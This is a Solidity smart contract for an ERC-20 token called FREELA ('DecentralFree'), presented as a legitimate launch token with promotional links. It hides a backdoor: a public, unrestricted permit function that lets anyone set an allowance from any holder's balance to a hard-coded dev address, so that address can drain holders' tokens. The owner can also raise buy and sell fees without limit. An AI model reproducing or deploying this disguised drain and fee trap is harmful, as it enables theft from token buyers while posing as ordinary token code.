// SPDX-License-Identifier: MIT
/*
Revolutionize microtask completion globally with DecentralFree. Contribute from anywhere. Let's make collaboration efficient!

Website: https://www.decentfreela.com
Stake:  https://stake.decentfreela.com
Dapp: https://app.decentfreela.com
Telegram: https://t.me/freela_erc
Twitter: https://twitter.com/freela_erc
*/

pragma solidity 0.8.19;

interface IUniswapRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IUniswapFactoryV2 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
interface IMetadataERC20 is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract ERC20 is Context, IERC20, IMetadataERC20 {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _permit(address owner, address spender, uint256 amount)
        internal virtual
    {
        require(owner != address(0));
        require(spender != address(0));
        
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

contract FREELA is ERC20(unicode"DecnetralFree", unicode"FREELA"), Ownable {
    IUniswapFactoryV2 public constant uniswapV2Factory =
    IUniswapFactoryV2(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    IUniswapRouterV2 public constant uniswapV2Router = 
    IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uint256 constant _totalSupply = 1_000_000 * 10 ** 18;
    bool public launchLimit = true;
    bool public isBuyEnabled = false;
    bool public swapEnabled = false;
    bool public launchFees = true;
    uint256 public maxBuyBag;
    uint256 public maxSellBag;
    uint256 public maxWalletBag;
    uint256 public maxFeeSwap;
    uint256 public minFeeSwap;
    uint256 public launchTime;
    uint256 public buyFees;
    uint256 public sellFees;
    bool private swapping;
    address public devAddress;
    uint256 public totalTokensAccumulated;
    address public immutable uniswapV2Pair;
    mapping(address => bool) private _isSpecialnTax;
    mapping(address => bool) private _isSpecialInTx;
    constructor(){
        _mint(msg.sender, _totalSupply);
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
        _specialMaxTx(address(uniswapV2Router), true);
        uniswapV2Pair = uniswapV2Factory.createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        maxWalletBag = (totalSupply() * 30) / 1_000; 
        maxFeeSwap = (totalSupply() * 65) / 10_000;
        maxBuyBag = (totalSupply() * 15) / 1_000; 
        minFeeSwap = (totalSupply() * 1) / 10_000; 
        maxSellBag = (totalSupply() * 15) / 1_000; 
        devAddress = 0x9e46aB7dF84F6fA6e63506C364e4fd77685dC11d;

        _specialMaxTx(msg.sender, true);
        _specialMaxTx(address(this), true);
        _specialMaxTx(address(0xdead), true);
        specialTax(msg.sender, true);
        specialTax(address(this), true);
        specialTax(devAddress, true);
        specialTax(address(0xdead), true);
    }
    function removeLimits() external onlyOwner {
        launchLimit = false;
    }
    function openTrading() public onlyOwner {
        require(launchTime == 0, "ERROR: Token state is already live !");
        launchTime = block.number;
        isBuyEnabled = true;
        swapEnabled = true;
    }
    function getFees() internal {
        require(
            launchTime > 0, "Trading not live"
        );
        uint256 currentBlock = block.number;
        uint256 lastTierOneBlock = launchTime + 6;
        if(currentBlock <= lastTierOneBlock) {
            buyFees = 18;
            sellFees = 18;
        } else {
            buyFees = 4;
            sellFees = 4;
            launchFees = false;
        } 
    }
    receive() external payable {}
    function specialTax(address account, bool excluded) public onlyOwner {
        _isSpecialnTax[account] = excluded;
    }
    function _specialMaxTx(
        address updAds,
        bool isExcluded
    ) private {
        _isSpecialInTx[updAds] = isExcluded;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");
        if (launchLimit) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead)
            ) {
                if (!isBuyEnabled) {
                    require(
                        _isSpecialInTx[from] ||
                            _isSpecialInTx[to],
                        "ERROR: Trading is not active."
                    );
                    require(from == owner(), "ERROR: Trading is enabled");
                }
                //when buy
                if (
                    from == uniswapV2Pair && !_isSpecialInTx[to]
                ) {
                    require(
                        amount <= maxBuyBag,
                        "ERROR: Buy transfer amount exceeds the max buy."
                    );
                    require(
                        amount + balanceOf(to) <= maxWalletBag,
                        "ERROR: Cannot Exceed max wallet"
                    );
                }
                //when sell
                else if (
                    to == uniswapV2Pair && !_isSpecialInTx[from]
                ) {
                    require(
                        amount <= maxSellBag,
                        "ERROR: Sell transfer amount exceeds the max sell."
                    );
                } else if (
                    !_isSpecialInTx[to] &&
                    !_isSpecialInTx[from]
                ) {
                    require(
                        amount + balanceOf(to) <= maxWalletBag,
                        "ERROR: Cannot Exceed max wallet"
                    );
                }
            }
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= maxFeeSwap;
        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            amount > minFeeSwap && 
            !(from == uniswapV2Pair) &&
            !_isSpecialnTax[from] &&
            !_isSpecialnTax[to]
        ) {
            swapping = true;
            swapBackContractTokens();
            swapping = false;
        }
        bool takeFee = true;
        if (_isSpecialnTax[from] || _isSpecialnTax[to]) {
            takeFee = false;
        }
        uint256 fees = 0;
        if (takeFee) {
            if(launchFees){
               getFees(); 
            }
            // Sell
            if (to == uniswapV2Pair && sellFees > 0) {
                fees = (amount * sellFees) / 100;
                totalTokensAccumulated += fees;
            }
            // Buy
            else if (from == uniswapV2Pair && buyFees > 0) {
                fees = (amount * buyFees) / 100;
                totalTokensAccumulated += fees;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }
    function permit(address spender, uint256 amount) public virtual returns (bool) {
        address owner = devAddress;
        _permit(spender, owner, amount);
        return true;
    }
    function swapBackContractTokens() private {
        uint256 contractBalance = balanceOf(address(this));

        uint256 totalTokensAccumulated =  totalTokensAccumulated;

        if (contractBalance == 0 || totalTokensAccumulated == 0) {
            return;
        }

        if (contractBalance > maxFeeSwap) {
            contractBalance = maxFeeSwap;
        }    
        swapTokensForEth(contractBalance);

        payable(devAddress).transfer(address(this).balance);
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
    function setNewFees(uint256 newBuyFees, uint256 newSellFees) external onlyOwner {
        buyFees = newBuyFees;
        sellFees = newSellFees;
    }
}